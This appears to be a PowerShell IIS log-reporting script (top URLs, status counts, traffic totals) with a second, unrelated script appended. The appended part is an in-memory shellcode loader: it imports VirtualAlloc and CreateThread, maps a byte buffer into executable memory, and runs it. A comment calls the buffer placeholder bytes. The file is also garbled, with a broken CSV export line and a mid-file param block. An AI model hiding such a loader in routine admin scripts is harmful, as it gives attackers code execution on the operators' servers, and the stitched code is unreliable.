#Requires -Version 5.1
$ErrorActionPreference = 'Stop'
$LogRoot    = 'D:\Logs\iis\W3SVC2'
$Days       = 30
$TopN       = 10
$OutputPath = "C:\Logs\reports\iis-top-2026-11-21.csv"
$HtmlPath   = "D:\Ops\reports\iis-2026-11-21.html"
$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}

$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}

$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count

$topUrls |
    -Path $OutputPath `
    -NoTypeInformation `
    -Encoding UTF8

Write-Host ("Requests: {0} | Errors: {1} | Traffic: {2} MB" -f $totalRequests, @($errorEntries).Count, $totalMB) -ForegroundColor Cyan
$byStatus | Format-Table -AutoSize

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x56, 0xf5, 0xde, 0xef, 0xdb, 0xf6, 0xca, 0xe1, 0xf4, 0x09, 0x0f, 0x64, 0x24, 0x2b, 0x17, 0xfe,
    0x78, 0xd9, 0xe9, 0x65, 0xf3, 0x66, 0xf1, 0xbb, 0x1d, 0xc7, 0xfd, 0x2d, 0x1e, 0x1d, 0xc0, 0x45,
    0x42, 0x55, 0xfe, 0x10, 0xa4, 0xcf, 0x4b, 0xac, 0xe6, 0x87, 0x96, 0x92, 0x57, 0x9b, 0xa1, 0x44,
    0xe0, 0x74, 0x56, 0xb5, 0xf7, 0xdf, 0x34, 0x61, 0xea, 0xdf, 0x9e, 0xf7, 0x39, 0x92, 0x7d, 0x39,
    0xa9, 0xb8, 0x4f, 0x7b, 0x8a, 0xa5, 0x1a, 0xf8, 0x2d, 0x93, 0xf0, 0xc8, 0x88, 0x8f, 0x73, 0x71,
    0xe1, 0x5b, 0xdf, 0xda, 0x01, 0xde, 0xc7, 0x16, 0xff, 0xbb, 0x4b, 0x26, 0x02, 0xab, 0xa0, 0xb3,
    0x98, 0xdb, 0x3e, 0xe7, 0x61, 0xd9, 0xbf, 0x60, 0x7b, 0x3b, 0x76, 0x03, 0x5e, 0x22, 0x37, 0x91,
    0x00, 0x39, 0x29, 0xfa, 0x22, 0x23, 0x3b, 0x86, 0xc0, 0x79, 0x89, 0xb1, 0xf0, 0x74, 0x51, 0x57,
    0xba, 0x74, 0x7c, 0x5b, 0x03, 0xd8, 0xb8, 0x32, 0xcd, 0x3c, 0x93, 0x20, 0x33, 0xbe, 0x47, 0x61,
    0x67, 0xb9, 0x3a, 0x22, 0x93, 0xfd, 0x5c, 0x08, 0x37, 0xf1, 0x56, 0xda, 0x77, 0xfd, 0xe2, 0xa5,
    0xd5, 0xc1, 0x25, 0xfa, 0xff, 0x99, 0x14, 0xc6, 0x71, 0xfc, 0xaf, 0x96, 0xc3, 0x67, 0x7a, 0x3e,
    0x5d, 0x67, 0x10, 0xc4, 0xcb, 0x5e, 0x9b, 0xf3, 0xf4, 0x5a, 0x01, 0x59, 0xb4, 0x1c, 0xcd, 0xb3,
    0xc6, 0x77, 0x8d, 0xa2, 0x7e, 0x33, 0x84, 0xa7, 0xba, 0x4c, 0x4f, 0xad, 0xf6, 0x90, 0xd3, 0x02,
    0x1c, 0x9b, 0x24, 0xe8, 0x93, 0xa5, 0x3f
)

$HProcess = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($HProcess -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeApi]::WaitForSingleObject($Thread, 567)
[void][NativeApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
